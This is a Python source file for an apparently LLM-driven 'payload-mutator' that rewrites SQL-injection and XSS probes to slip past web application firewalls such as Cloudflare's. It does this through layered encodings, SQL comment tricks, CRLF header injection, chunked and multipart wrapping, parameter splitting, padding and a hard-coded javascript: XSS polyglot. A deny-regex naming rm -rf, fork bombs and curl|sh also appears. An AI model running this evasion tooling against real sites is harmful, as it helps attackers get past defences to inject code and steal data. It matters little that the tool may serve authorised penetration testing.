#!/usr/bin/env python3
"""
run.py -- payload-mutator entry point.

Takes a base payload and generates BOUNDED, DETERMINISTIC mutations across four
levels -- encoding, syntax, context, composition. The LLM picks which levels to
apply; this deterministic code executes the transformations. Every selection is
seeded (per-level `random.Random(f"{seed}:{level}")`), so the same seed + same
payload always yields the identical mutation set -- the Oracle can reproduce it.

This is a GENERATOR. It sends nothing; it re-encodes an existing probe payload.
It does not invent OS/shell weaponization: a base payload carrying destructive
tokens (rm -rf, mkfs, curl|sh, fork bomb) is refused so the mutator is never used
to dress up a destructive command. `meta.sends_traffic:false`.

BUDGET
------
<= max_mutations_per_level (default 8) per level, <= 4 levels. If the total
exceeds 32 mutations the full set is offloaded to the spill store and only a
capped preview is inlined (Offload Law).

CONTRACT
--------
* Input  : {"base_payload":"...", "seed":42, "blocked_by":"cloudflare_waf",
            "levels_to_apply":[1,2,3,4], "max_mutations_per_level":8}
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
"""
from __future__ import annotations

import base64
import json
import os
import random
import re
import sys
import urllib.parse
from dataclasses import dataclass, asdict
from datetime import datetime, timezone
from typing import Any, Dict, List

try:
    from spill_store import write_spill
except ImportError:  # pragma: no cover
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from spill_store import write_spill  # type: ignore

PREVIEW_CAP = 32  # inline at most this many; offload the rest
DESTRUCTIVE = re.compile(
    r"\brm\s+-rf\b|\bmkfs\b|\bdd\s+if=|:\(\)\s*\{\s*:\|:|\bshutdown\b|\breboot\b|"
    r"\bcurl\b[^\n|]*\|\s*(sh|bash)\b|\bwget\b[^\n|]*\|\s*(sh|bash)\b|>\s*/dev/sd", re.I)

_KEYWORDS = re.compile(
    r"\b(select|union|insert|update|delete|from|where|and|or|script|alert|onerror|"
    r"onload|img|svg|drop|concat|sleep|benchmark|load_file|waitfor)\b", re.I)


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


@dataclass
class Mutation:
    base_payload: str
    mutated_payload: str
    level: int
    mutation_type: str
    seed: int
    encoding_chain: List[str]


# --- primitive encoders -------------------------------------------------------
def _url(s: str) -> str:
    return urllib.parse.quote(s, safe="")


def _double_url(s: str) -> str:
    return _url(_url(s))


def _unicode_u(s: str) -> str:
    return "".join("%%u%04X" % ord(c) for c in s)


def _hex_0x(s: str) -> str:
    return "0x" + s.encode("utf-8").hex()


def _b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def _html_entities(s: str) -> str:
    return "".join("&#%d;" % ord(c) for c in s)


def _case_swap(s: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def _keyword_comment(s: str) -> str:
    out = _KEYWORDS.sub(lambda m: "/*!50000" + m.group(0) + "*/", s)
    return out if out != s else (s.replace(" ", "/**/", 1) if " " in s else s + "/**/")


def _space_comment(s: str) -> str:
    return s.replace(" ", "/**/")


def _string_concat(s: str) -> str:
    # SQL-style string splitting of quoted literals; falls back to char concat
    def split_lit(m: "re.Match[str]") -> str:
        inner = m.group(1)
        if len(inner) < 2:
            return m.group(0)
        mid = len(inner) // 2
        return f"'{inner[:mid]}'+'{inner[mid:]}'"
    out = re.sub(r"'([^']+)'", split_lit, s)
    return out if out != s else s.replace(" ", " /**/ ")


def _null_byte(s: str) -> str:
    return s + "%00"


def _newline_inject(s: str) -> str:
    return _KEYWORDS.sub(lambda m: m.group(0) + "%0a", s, count=1) if _KEYWORDS.search(s) else s + "%0a"


class PayloadMutator:
    def __init__(self, payload: dict):
        self.payload = payload or {}
        self.base = str(self.payload.get("base_payload", "") or "")
        self.seed = int(self.payload.get("seed", 42) or 42)
        self.blocked_by = str(self.payload.get("blocked_by", "") or "")
        self.levels = list(self.payload.get("levels_to_apply", [1, 2, 3, 4]) or [1, 2, 3, 4])
        self.max_per = int(self.payload.get("max_mutations_per_level", 8) or 8)
        self.errors: List[Dict[str, str]] = []

    def _rng(self, level: int) -> random.Random:
        return random.Random("%d:%d:%s" % (self.seed, level, self.base))

    def _mk(self, mutated: str, level: int, mtype: str, chain: List[str]) -> Mutation:
        return Mutation(self.base, mutated, level, mtype, self.seed, chain)

    # -- Level 1: encoding --------------------------------------------------
    def level1_encoding(self, p: str) -> List[Mutation]:
        return [
            self._mk(_url(p), 1, "url_encode", ["url"]),
            self._mk(_double_url(p), 1, "double_url_encode", ["url", "url"]),
            self._mk(_unicode_u(p), 1, "unicode_percent_u", ["unicode_%u"]),
            self._mk(_hex_0x(p), 1, "hex_0x", ["hex_0x"]),
            self._mk(_b64(p), 1, "base64", ["base64"]),
            self._mk(_html_entities(p), 1, "html_entities", ["html_entities"]),
        ]

    # -- Level 2: syntax ----------------------------------------------------
    def level2_syntax(self, p: str) -> List[Mutation]:
        return [
            self._mk(_keyword_comment(p), 2, "comment_injection", ["comment_/**/"]),
            self._mk(_case_swap(p), 2, "case_swap", ["case_swap"]),
            self._mk(_space_comment(p), 2, "whitespace_to_comment", ["space->/**/"]),
            self._mk(_string_concat(p), 2, "string_concatenation", ["concat"]),
            self._mk(_null_byte(p), 2, "null_byte_insertion", ["null_byte"]),
            self._mk(_newline_inject(p), 2, "newline_injection", ["newline"]),
        ]

    # -- Level 3: context ---------------------------------------------------
    def level3_context(self, p: str) -> List[Mutation]:
        json_wrap = json.dumps({"q": p})
        xml = "<x>" + (p.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                       .replace("'", "&#x27;").replace('"', "&#x22;")) + "</x>"
        header_inj = _url(p) + "%0d%0aX-Injected-Canary:1"
        data = p.encode("utf-8")
        mid = max(1, len(data) // 2)
        chunked = ("%x\r\n%s\r\n%x\r\n%s\r\n0\r\n\r\n"
                   % (mid, data[:mid].decode("latin1"), len(data) - mid, data[mid:].decode("latin1")))
        boundary = "----mut%08x" % (self._rng(3).getrandbits(32))
        multipart = ("--%s\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n%s\r\n--%s--\r\n"
                     % (boundary, p, boundary))
        return [
            self._mk(json_wrap, 3, "json_body_wrap", ["json"]),
            self._mk(xml, 3, "xml_entity", ["xml_entity"]),
            self._mk(header_inj, 3, "header_injection", ["url", "crlf"]),
            self._mk(chunked, 3, "chunked_transfer", ["chunked"]),
            self._mk(multipart, 3, "multipart_form", ["multipart"]),
        ]

    # -- Level 4: composition ----------------------------------------------
    def level4_composition(self, p: str) -> List[Mutation]:
        nested = _url(_unicode_u(p))
        half = max(1, len(p) // 2)
        split = "q1=%s&q2=%s" % (_url(p[:half]), _url(p[half:]))
        polyglot = ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=1)//%%0D%%0A"
                    "'-->]]>%s<!--" % p)
        junk_n = self._rng(4).randint(512, 2048)
        padded = ("A" * junk_n) + p
        return [
            self._mk(nested, 4, "nested_encoding", ["unicode_%u", "url"]),
            self._mk(split, 4, "split_across_params", ["hpp_split", "url"]),
            self._mk(polyglot, 4, "polyglot_multicontext", ["polyglot"]),
            self._mk(padded, 4, "buffer_padding", ["junk_pad(%d)" % junk_n]),
        ]

    # -- orchestration ------------------------------------------------------
    def apply_all(self) -> List[Mutation]:
        gen = {1: self.level1_encoding, 2: self.level2_syntax,
               3: self.level3_context, 4: self.level4_composition}
        out: List[Mutation] = []
        for lvl in sorted(set(int(x) for x in self.levels if int(x) in gen)):
            candidates = [m for m in gen[lvl](self.base) if m.mutated_payload and m.mutated_payload != self.base]
            # seeded, reproducible ordering, then cap to the per-level budget
            self._rng(lvl).shuffle(candidates)
            out.extend(candidates[: self.max_per])
        return out

    def return_artifact(self) -> dict:
        if not self.base:
            return self._err("empty base_payload")
        if DESTRUCTIVE.search(self.base):
            return self._err("refused: base_payload contains a destructive OS/shell token; "
                             "the mutator re-encodes probes, it does not dress up destructive commands")
        muts = self.apply_all()
        dicts = [asdict(m) for m in muts]
        total = len(dicts)
        spill_id = None
        inline = dicts
        if total > PREVIEW_CAP:
            spill_id = write_spill({"base_payload": self.base, "seed": self.seed,
                                    "mutations": dicts, "total_count": total})
            inline = dicts[:PREVIEW_CAP]
        return {
            "mutations": inline,
            "total_count": total,
            "spill_id": spill_id,
            "meta": {
                "skill": "payload-mutator", "version": "1.0", "phase": "5",
                "loop_component": "32-payload-mutator", "status": "ok",
                "generated_at": _now_iso(), "seed": self.seed, "blocked_by": self.blocked_by,
                "levels_applied": sorted(set(int(x) for x in self.levels if int(x) in (1, 2, 3, 4))),
                "max_mutations_per_level": self.max_per,
                "inlined": len(inline), "offloaded": spill_id is not None,
                "deterministic": True, "sends_traffic": False,
            },
            "errors": self.errors,
        }

    def _err(self, msg: str) -> dict:
        return {"mutations": [], "total_count": 0, "spill_id": None,
                "meta": {"skill": "payload-mutator", "version": "1.0", "phase": "5",
                         "loop_component": "32-payload-mutator", "status": "error",
                         "generated_at": _now_iso(), "sends_traffic": False},
                "errors": self.errors + [{"stage": "mutate", "error": msg}]}


# --- entry point -------------------------------------------------------------
def _load_input(argv: List[str]) -> dict:
    raw = ""
    if len(argv) > 1 and argv[1].strip():
        raw = argv[1]
    elif not sys.stdin.isatty():
        raw = sys.stdin.read()
    raw = raw.strip()
    if not raw:
        raise ValueError('no input: expected JSON {"base_payload": "..."}')
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("input must be a JSON object")
    return obj


def _error_artifact(msg: str) -> dict:
    return {"mutations": [], "total_count": 0, "spill_id": None,
            "meta": {"skill": "payload-mutator", "version": "1.0", "phase": "5",
                     "status": "error", "generated_at": _now_iso(), "sends_traffic": False},
            "errors": [{"stage": "init", "error": msg}]}


def main() -> int:
    try:
        payload = _load_input(sys.argv)
    except Exception as exc:  # noqa: BLE001
        print(json.dumps(_error_artifact(f"input error: {exc}")))
        return 2
    art = PayloadMutator(payload).return_artifact()
    print(json.dumps(art, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
